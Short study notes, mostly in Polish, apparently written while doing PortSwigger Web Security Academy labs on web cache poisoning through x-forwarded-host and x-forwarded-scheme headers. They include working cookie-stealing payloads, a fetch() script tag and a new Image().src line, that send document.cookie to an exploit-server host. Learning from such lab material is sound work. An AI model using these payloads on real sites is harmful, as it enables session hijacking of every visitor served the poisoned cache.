Multiple headers<br>
GET /resources/js/tracking.js<br>
x-forwarded-scheme: nohttps<br>
x-forwarded-host: exploitserver<br>
<br>
<img width="1346" height="808" alt="image" src="https://github.com/user-attachments/assets/8ec209af-8724-4122-9c8e-0e9ee6eeb7cd" />

najpierw cwicze u siebie z alert(document.cookie);
<br>
Fetch zadziała jeśli ciasteczko nie ma flagi HttpOnly<br>
<script>fetch('https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie)</script>
<br>
new Image() — klasyczny wektor, działa nawet jeśli CSP blokuje fetch/XHR ale nie blokuje img-src:<br>
new Image().src='https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie


<hr>

Obserwacja: Co atakujesz <br>
Payload (z-foprwarded-host: exploit server) z nagłówka pojawia się wprost w body /	- atakuje /<br>
Payload (z-foprwarded-host: exploit server) z naglowka zmienia tylko Location/redirect na payload,	Zasób importowany przez / (np. tracking.js)  - atakuje tracking.js<br>
Kombinacja 2+ nagłówków potrzebna do efektu (osobno nic nie robią)	Zwykle wskazuje na zasób pomocniczy - atakuje tracking.js<br>

<hr>

Karol Cz.: Strona ładuje pliki javscript pobierajac je z pelnego url z hostem, a ty zatruwasz hosta naglowkiem host, x-forwarded-host albo cokolwiek innego i strona zaczyna po prostu ładować wszystko z twojego hosta

❤️ Jak zacacheuje (masz cache hit) to globalnie to sie stanie I kazdy dostanie kontent z twojego serwera

